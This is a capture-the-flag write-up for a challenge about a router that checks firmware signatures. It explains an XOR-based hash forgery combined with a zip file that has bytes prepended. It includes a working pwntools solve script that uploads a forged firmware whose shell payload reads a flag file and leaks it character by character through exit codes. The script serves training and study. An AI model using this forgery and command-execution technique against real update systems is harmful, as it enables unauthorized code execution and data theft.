[HV23.13] Santa's Router (fabi_07)
### Description
> Santa came across a weird service that provides something with signatures of a firmware. He isn't really comfortable with all that crypto stuff, can you help him with this?
### Solution
The code actually has two vunerabilities. Firstly the hashing function just xores the result. Second, the python zip library actually doesn't care about trailing/prepended bytes. With these two combined, you could make a new firmware.zip and fix the hash by appending the correct 8-bytes. Now you got multiple options. Firstly, you can exfiltrate the flag to a local http server or you can use the return value to leak the flag one character at a time. While writing the challenge, i intended the participants to leak the flag this way, but a couple of smart people just overwrote the chall.py with ```print(flag)```.

[solve.py:](./13-santas-router-source/solve.py)
```py
import base64
from io import BytesIO
import zipfile
from pwn import *

def hashFile(fileContent:bytes) -> int:
    hash = 0
    for i in range(0, len(fileContent), 8):
        hash ^= sum([fileContent[i+j] << 8*j for j in range(8) if i+j < len(fileContent)])
    return hash

r = remote('localhost', 1337)

r.sendlineafter(b'$', b'version')
r.recvuntil(b'Signature: ')
signature = r.recvline()[:-1]

flag = ' '

while flag[-1] != '\0':
    payload = f'''exit $(printf '%d' "'$(cat flag | cut -c {len(flag)})")'''   # payload sent to the server
    with BytesIO() as buffer:
        with zipfile.ZipFile(buffer, 'a', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('start.sh', payload)
        # Rewind the buffer to the beginning before reading its content
        buffer.seek(0)
        newZipContent = buffer.read()

    with open('firmware.zip', 'rb') as f:
        hashOld = hashFile(f.read())
        hashNew = hashFile(newZipContent)
        difference = hashOld ^ hashNew          # Calculate the difference in the hash
        diffBytes = bytes([(difference & (255 << 8*j)) >> 8*j for j in range(8)])       # Calculate the bytes to fix the hash
        newZipContent = diffBytes+newZipContent     # Zip's actually don't care about data in the beginning
        zipEncodedData = base64.b64encode(newZipContent)

    r.sendlineafter(b'$', b'update')
    r.sendlineafter(b'>', zipEncodedData)
    r.sendlineafter(b'>', signature)

    flag += chr(int(r.recvline().strip().split()[-1].decode()))

print(f'Flag: {flag}')
```

Flag: **HV23{wait_x0r_is_not_a_secure_hash_function}**